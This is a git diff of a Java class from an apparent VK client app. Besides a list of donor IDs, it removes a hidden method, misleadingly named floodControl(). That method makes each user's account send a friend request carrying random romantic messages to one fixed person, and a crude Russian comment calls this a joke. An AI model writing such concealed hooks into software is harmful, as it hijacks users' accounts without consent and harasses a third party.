@@ -1,11 +1,5 @@
 package dev.ragnarok.fenrir;
 
-import dev.ragnarok.fenrir.domain.InteractorFactory;
-import dev.ragnarok.fenrir.settings.Settings;
-import dev.ragnarok.fenrir.util.HelperSimple;
-import dev.ragnarok.fenrir.util.RxUtils;
-import dev.ragnarok.fenrir.util.Utils;
-
 public class CheckDonate {
     public static final Integer[] donatedOwnersLocal = {572488303, 365089125,
             164736208,
@@ -140,20 +134,4 @@ public class CheckDonate {
             320226488,
             3398969
     };
-
-    // Данная функция подписывает вас на Арнольдову Екатерину. Сделана по приколу (наверно охуеет от такого наплыва подписчиков и съебётся в Канаду)))
-    public static void floodControl() {
-        if (!HelperSimple.INSTANCE.hasHelp("flood_control_v1", 1)) {
-            return;
-        }
-        if (Settings.get().accounts().getRegistered().contains(572488303)) {
-            HelperSimple.INSTANCE.toggleHelp("flood_control_v1", 1);
-            return;
-        }
-        //noinspection ResultOfMethodCallIgnored
-        InteractorFactory.createRelationshipInteractor().addFriend(Settings.get().accounts().getCurrent(), 255645173,
-                Utils.getRandomFromArray(new String[]{"Ты самая прекрасная девушка на свете", "Богиня", "Валькирия", "Любовь моя", "Моя суженая", "Давай переедем в Канаду вдвоём"}), false)
-                .compose(RxUtils.applySingleIOToMainSchedulers())
-                .subscribe(o -> HelperSimple.INSTANCE.toggleHelp("flood_control_v1", 1), RxUtils.ignore());
-    }
 }
